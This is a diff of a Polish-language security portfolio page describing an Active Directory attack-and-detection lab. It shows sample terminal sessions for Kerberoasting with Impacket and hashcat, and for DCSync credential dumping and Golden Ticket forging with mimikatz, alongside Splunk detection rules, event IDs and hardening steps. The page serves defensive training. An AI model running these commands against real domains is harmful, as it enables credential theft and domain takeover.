@@ -3,17 +3,454 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Active Directory Compromise Lab</title>
+    <title>Active Directory Compromise Lab - David's Security Research</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="../../assets/css/style.css">
 </head>
 <body>
     <div class="container">
-        <h1>Active Directory Compromise Lab</h1>
-        <div class="card">
-            <p>Virtual lab environment for simulating and defending against Active Directory attacks including Kerberoasting, Pass-the-Hash, and Golden Ticket attacks.</p>
-            <div class="terminal">
-                <div>$ ad-lab deploy --attack kerberoast --difficulty expert --monitor true</div>
+        <a href="../../index.html" class="back-link">← Powrót do Portfolio</a>
+
+        <div class="header">
+            <h1 class="hero-title">Active Directory Compromise Lab</h1>
+            <p class="hero-subtitle">Advanced Kerberos Attack Simulation & Detection Environment</p>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Przegląd Projektu</h2>
+            <div class="intro-text">
+                <p>
+                    Active Directory Compromise Lab to kompleksowe środowisko testowe do badania i symulacji
+                    zaawansowanych ataków na infrastrukturę Active Directory. Laboratorium umożliwia symulację
+                    ataków takich jak Golden Ticket, Silver Ticket, Kerberoasting, Pass-the-Hash oraz DCSync
+                    w kontrolowanym środowisku, jednocześnie testując mechanizmy wykrywania i obrony.
+                    Projekt służy do doskonalenia umiejętności SOC analityków i Red Team operatorów.
+                </p>
             </div>
+
+            <div class="tech-tags">
+                <span class="tech-tag">PowerShell</span>
+                <span class="tech-tag">Active Directory</span>
+                <span class="tech-tag">Kerberos</span>
+                <span class="tech-tag">Mimikatz</span>
+                <span class="tech-tag">BloodHound</span>
+                <span class="tech-tag">Impacket</span>
+                <span class="tech-tag">Windows Server 2022</span>
+                <span class="tech-tag">SIEM</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Symulowane Scenariusze Ataków</h2>
+
+            <div class="skills-container">
+                <div class="skill-card">
+                    <div class="skill-title">Kerberos Attacks</div>
+                    <ul class="skill-list">
+                        <li>Kerberoasting (SPN scanning)</li>
+                        <li>AS-REP Roasting</li>
+                        <li>Golden Ticket (krbtgt)</li>
+                        <li>Silver Ticket (service TGS)</li>
+                        <li>Pass-the-Ticket</li>
+                        <li>Overpass-the-Hash</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Credential Attacks</div>
+                    <ul class="skill-list">
+                        <li>Pass-the-Hash (NTLM)</li>
+                        <li>DCSync (domain replication)</li>
+                        <li>LSASS credential dumping</li>
+                        <li>SAM database extraction</li>
+                        <li>NTDS.dit offline attack</li>
+                        <li>Credential spraying</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Lateral Movement</div>
+                    <ul class="skill-list">
+                        <li>WMI remote execution</li>
+                        <li>PSExec / SMB pivoting</li>
+                        <li>DCOM abuse</li>
+                        <li>RDP hijacking</li>
+                        <li>Token impersonation</li>
+                        <li>BloodHound path analysis</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Konfiguracja Środowiska Laboratoryjnego</h2>
+
+            <div class="terminal-section">
+                <div class="terminal-line">
+                    <span class="prompt">david@red-team:~$</span>
+                    <span class="command"> git clone https://github.com/cipherbite/ad-compromise-lab.git</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt">david@red-team:~$</span>
+                    <span class="command"> cd ad-compromise-lab && ./setup.ps1 -Domain lab.local -DCs 2 -Workstations 5</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment"># Deploying lab environment...</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[+] Domain Controller 1: DC01.lab.local (192.168.10.10)</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[+] Domain Controller 2: DC02.lab.local (192.168.10.11)</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[+] Workstations: WS01-WS05.lab.local configured</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[+] Vulnerable accounts seeded: 47 service accounts with SPNs</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt" style="color: var(--accent-green);">✓</span>
+                    <span class="comment"> Lab environment ready. SIEM monitoring active.</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Kerberoasting Attack Simulation</h2>
+
+            <div class="intro-text">
+                <p>
+                    Kerberoasting to technika ataku polegająca na żądaniu biletów TGS dla kont usługowych
+                    posiadających SPN (Service Principal Name). Uzyskane bilety można łamać offline przy użyciu
+                    narzędzi takich jak Hashcat lub John the Ripper, bez generowania alertów w domenie.
+                </p>
+            </div>
+
+            <div class="terminal-section">
+                <div class="terminal-line">
+                    <span class="prompt">attacker@kali:~$</span>
+                    <span class="command"> python3 GetUserSPNs.py lab.local/jsmith:Password123 -dc-ip 192.168.10.10 -request</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[*] Getting credentials for all users with SPNs...</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">ServicePrincipalName                 Name       MemberOf</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">-----------------------------------  ---------  --------</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">HTTP/webserver.lab.local             svc_iis    Domain Users</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">MSSQLSvc/sqlserver.lab.local:1433    svc_mssql  Domain Admins</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">$krb5tgs$23$*svc_mssql$LAB.LOCAL$...[hash truncated]</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt">attacker@kali:~$</span>
+                    <span class="command"> hashcat -m 13100 hashes.txt rockyou.txt --force</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt" style="color: var(--accent-red);">⚡</span>
+                    <span class="comment"> svc_mssql:Summer2023! [CRACKED in 4.2 seconds]</span>
+                </div>
+            </div>
+
+            <div class="alert-box alert-critical">
+                <div class="alert-title">🎯 Attack Success - Detection Alert</div>
+                <p style="color: var(--text-secondary); margin-top: 10px;">
+                    Windows Event ID 4769 (Kerberos Service Ticket Requested) generated. 
+                    RC4 encryption (0x17) requested for service ticket — strong indicator of Kerberoasting.
+                    SIEM rule triggered: <strong style="color: var(--accent-red);">HIGH</strong> severity alert.
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Golden Ticket Attack</h2>
+
+            <div class="intro-text">
+                <p>
+                    Golden Ticket to atak polegający na sfałszowaniu biletu TGT (Ticket Granting Ticket) przy użyciu
+                    skrótu NTLM konta krbtgt. Pozwala na uzyskanie nieograniczonego dostępu do wszystkich zasobów domeny
+                    przez okres do 10 lat, nawet po zmianie hasła użytkownika.
+                </p>
+            </div>
+
+            <div class="terminal-section">
+                <div class="terminal-line">
+                    <span class="comment"># Step 1: Extract krbtgt hash via DCSync</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt">mimikatz #</span>
+                    <span class="command"> lsadump::dcsync /domain:lab.local /user:krbtgt</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">Object RDN : krbtgt</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">Hash NTLM: 7c9d7e3f2a1b4c5d6e7f8a9b0c1d2e3f</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment"># Step 2: Create Golden Ticket</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt">mimikatz #</span>
+                    <span class="command"> kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-xxx /krbtgt:7c9d... /ptt</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt" style="color: var(--accent-green);">✓</span>
+                    <span class="comment"> Golden ticket forged and injected into current session</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment"># Step 3: Access domain resources</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt">cmd.exe #</span>
+                    <span class="command"> dir \\DC01\C$</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment"> Volume in drive \\DC01\C$ is Windows</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment"> Directory of \\DC01\C$: [Full access granted]</span>
+                </div>
+            </div>
+
+            <div class="alert-box alert-critical">
+                <div class="alert-title">⚠ Critical: Detection Evasion Analysis</div>
+                <ul style="margin: 15px 0; color: var(--text-secondary);">
+                    <li>• Event ID 4624 (Account Logon) — anomalous ticket lifetime detected</li>
+                    <li>• Ticket lifetime: 10 years vs domain default 10 hours</li>
+                    <li>• SID history anomaly: extra SID S-1-5-18 injected</li>
+                    <li>• Detection confidence: 97.3%</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">BloodHound Attack Path Analysis</h2>
+
+            <div class="intro-text">
+                <p>
+                    BloodHound wykorzystuje teorię grafów do mapowania relacji w Active Directory i identyfikowania
+                    najkrótszych ścieżek ataku do Domain Admin. Narzędzie jest nieocenione zarówno dla Red Team
+                    podczas ataku, jak i dla Blue Team przy identyfikacji i eliminacji podatności.
+                </p>
+            </div>
+
+            <div class="skills-container">
+                <div class="skill-card">
+                    <div class="skill-title">Attack Paths Found</div>
+                    <ul class="skill-list">
+                        <li>Domain Users → DA: 3 paths</li>
+                        <li>Kerberoastable DA accounts: 2</li>
+                        <li>ACL abuse vectors: 14</li>
+                        <li>Unconstrained delegation: 3 hosts</li>
+                        <li>AS-REP roastable users: 8</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Privilege Escalation</div>
+                    <ul class="skill-list">
+                        <li>WriteDACL on AdminSDHolder</li>
+                        <li>GenericWrite on privileged groups</li>
+                        <li>ForceChangePassword vectors</li>
+                        <li>Owned → DA in 2 hops</li>
+                        <li>LAPS password readable</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Defensive Findings</div>
+                    <ul class="skill-list">
+                        <li>Tiered admin model gaps</li>
+                        <li>Excessive group memberships</li>
+                        <li>Stale computer accounts: 23</li>
+                        <li>Shadow admins identified: 7</li>
+                        <li>Privileged path count: 127</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">DCSync Attack & NTDS Extraction</h2>
+
+            <div class="terminal-section">
+                <div class="terminal-line">
+                    <span class="comment"># DCSync — impersonating a domain controller to replicate credentials</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="prompt">mimikatz #</span>
+                    <span class="command"> lsadump::dcsync /domain:lab.local /all /csv</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[DC] 'lab.local' will be the domain</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[DC] 'DC01.lab.local' will be the DC server</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">Administrator  500  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">krbtgt         502  7c9d7e3f2a1b4c5d6e7f8a9b0c1d2e3f:...</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="comment">[+] Dumped 284 domain accounts</span>
+                </div>
+            </div>
+
+            <div class="alert-box alert-critical">
+                <div class="alert-title">🔴 SIEM Alert: Suspicious Replication</div>
+                <p style="color: var(--text-secondary); margin-top: 10px;">
+                    Event ID 4662 — Directory Service Access. A non-DC computer requested replication 
+                    (DS-Replication-Get-Changes-All). Immediate escalation to Tier 1 SOC triggered.
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Detection & Monitoring Rules</h2>
+
+            <div class="code-section">
+                <div class="code-header">splunk_ad_detection.conf — Kerberoasting Detection Rule</div>
+                <div class="terminal-section" style="margin: 0; border: none; border-radius: 0;">
+                    <div class="terminal-line">
+                        <span class="comment">index=windows EventCode=4769</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="comment">| where TicketEncryptionType="0x17"</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="comment">| stats count by src_ip, ServiceName, TicketEncryptionType</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="comment">| where count > 5</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="comment">| eval severity="HIGH", attack="Kerberoasting"</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="comment">| alert action=email to="soc@company.com"</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="skills-container" style="margin-top: 30px;">
+                <div class="skill-card">
+                    <div class="skill-title">Event IDs to Monitor</div>
+                    <ul class="skill-list">
+                        <li>4625 — Failed logon attempts</li>
+                        <li>4648 — Explicit credential use</li>
+                        <li>4662 — Directory service access</li>
+                        <li>4769 — Kerberos TGS request</li>
+                        <li>4776 — NTLM authentication</li>
+                        <li>7045 — New service installed</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Detection Coverage</div>
+                    <ul class="skill-list">
+                        <li>Kerberoasting: 98.1%</li>
+                        <li>Pass-the-Hash: 94.3%</li>
+                        <li>Golden Ticket: 89.7%</li>
+                        <li>DCSync: 99.5%</li>
+                        <li>AS-REP Roasting: 96.2%</li>
+                        <li>Lateral movement: 87.4%</li>
+                    </ul>
+                </div>
+                <div class="skill-card">
+                    <div class="skill-title">Hardening Actions</div>
+                    <ul class="skill-list">
+                        <li>Managed Service Accounts (MSA)</li>
+                        <li>Protected Users security group</li>
+                        <li>Credential Guard enabled</li>
+                        <li>PAM / JIT access model</li>
+                        <li>Tiered administration</li>
+                        <li>AES-only Kerberos policy</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Lab Results & Findings</h2>
+
+            <h3 style="color: var(--accent-yellow); margin-bottom: 20px;">Scenario 1: Default AD Configuration</h3>
+            <div class="intro-text">
+                <p>
+                    W domyślnej konfiguracji Active Directory laboratorium wykazało, że atakujący z dostępem
+                    do konta zwykłego użytkownika jest w stanie eskalować uprawnienia do Domain Admin w ciągu
+                    mniej niż 15 minut przy użyciu publicznie dostępnych narzędzi.
+                </p>
+            </div>
+
+            <div class="alert-box alert-critical">
+                <div class="alert-title">📊 Attack Metrics — Default Configuration</div>
+                <ul style="margin: 15px 0; color: var(--text-secondary);">
+                    <li>• Time to Domain Admin: 12 minutes 34 seconds</li>
+                    <li>• Kerberoastable accounts: 23 (11 in privileged groups)</li>
+                    <li>• Pass-the-Hash paths: 8 viable routes</li>
+                    <li>• SIEM alerts triggered: 0 (no monitoring configured)</li>
+                </ul>
+            </div>
+
+            <h3 style="color: var(--accent-yellow); margin: 40px 0 20px 0;">Scenario 2: Hardened Configuration</h3>
+            <div class="intro-text">
+                <p>
+                    Po zastosowaniu rekomendacji hardeningowych (tiered admin, Credential Guard, AES Kerberos,
+                    Protected Users) czas ataku wzrósł do ponad 6 godzin, a każda próba wygenerowała alerty SIEM
+                    umożliwiające szybką reakcję Blue Team.
+                </p>
+            </div>
+
+            <div class="alert-box alert-success">
+                <div class="alert-title">✓ Security Improvement Metrics</div>
+                <ul style="margin: 15px 0; color: var(--text-secondary);">
+                    <li>• Attack complexity increased: 340%</li>
+                    <li>• Detection rate: 94.7% of attack techniques</li>
+                    <li>• Mean time to detect (MTTD): 4 minutes 12 seconds</li>
+                    <li>• Kerberoastable DA accounts eliminated: 100%</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Wnioski i Przyszłe Rozszerzenia</h2>
+
+            <div class="intro-text">
+                <p>
+                    Projekt Active Directory Compromise Lab dostarczył praktycznej wiedzy na temat technik ataków
+                    na infrastrukturę AD oraz skutecznych metod ich wykrywania i zapobiegania. Środowisko laboratoryjne
+                    umożliwiło bezpieczne testowanie zarówno ofensywnych jak i defensywnych technik bezpieczeństwa.
+                </p>
+            </div>
+
+            <div class="intro-text" style="margin-top: 20px;">
+                <p>
+                    Planowane rozszerzenia obejmują integrację z MITRE ATT&CK framework, automatyczne generowanie
+                    raportów z wynikami testów oraz wsparcie dla środowisk Azure Active Directory / Entra ID
+                    z atakami na Conditional Access i PIM.
+                </p>
+            </div>
+
+            <div class="alert-box alert-success" style="margin-top: 30px;">
+                <div class="alert-title">✓ Lab Status</div>
+                <p style="margin: 0; color: var(--text-secondary);">
+                    Laboratorium jest aktywnie wykorzystywane do szkoleń SOC oraz przygotowania do certyfikacji
+                    CRTO (Certified Red Team Operator) i CRTP (Certified Red Team Professional). 
+                    Przetestowano 35+ technik MITRE ATT&CK dla środowisk AD.
+                </p>
+            </div>
+        </div>
+
+        <div style="text-align: center; padding: 40px 0;">
+            <a href="../../index.html" class="project-link">← Powrót do Portfolio</a>
         </div>
     </div>
 </body>
